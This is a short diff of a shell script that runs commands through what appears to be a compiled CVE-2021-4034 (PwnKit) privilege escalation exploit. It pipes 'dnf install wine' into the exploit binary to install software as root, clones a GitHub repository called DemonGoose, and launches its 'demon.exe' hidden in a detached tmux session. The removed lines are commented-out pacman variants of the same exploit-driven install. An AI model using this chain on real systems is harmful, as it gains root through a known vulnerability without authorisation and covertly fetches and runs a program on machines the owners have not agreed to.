@@ -12,6 +12,4 @@ done
 make
 echo "dnf install wine" | ./cve-2021-4034
 git clone --single-branch --branch visuals https://github.com/QuentinBriand/DemonGoose
-# echo "pacman -Sy tmux"
-# echo "pacman -Sy wine" | ./cve-2021-4034
 tmux new -d wine DemonGoose/DemonThings/demon.exe
